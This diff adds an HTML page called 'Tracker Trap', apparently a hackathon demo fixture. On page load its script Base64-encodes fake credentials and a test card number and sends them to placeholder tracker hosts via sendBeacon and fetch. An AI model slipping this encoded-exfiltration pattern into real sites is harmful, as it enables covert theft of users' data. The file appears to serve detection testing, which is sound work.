@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Tracker Trap</title>
+</head>
+<body>
+    <h1>🕵️ Tracker Trap</h1>
+    <p>Sending hidden Base64 data...</p>
+
+    <script>
+        // 1. Create a "Secret" that looks like a privacy violation
+        const secretData = JSON.stringify({
+            user_id: "judge_demo_user",
+            email: "judge@hackathon.com",
+            password: "password123",
+            credit_card: "4111-1111-1111-1111"
+        });
+
+        // 2. Hide it using Base64 Encoding (btoa)
+        const encodedData = btoa(secretData);
+        console.log("Encoded Secret:", encodedData);
+
+        // 3. Send it to a fake tracker URL
+        // We use 'navigator.sendBeacon' which is what real trackers use
+        navigator.sendBeacon(`https://tracking-pixel.com/collect?data=${encodedData}`);
+
+        // 4. Also try a POST request which is common for heavy tracking
+        fetch('https://ad-network.com/log', {
+            method: 'POST',
+            body: encodedData // Sending the raw Base64 string
+        });
+    </script>
+</body>
+</html>
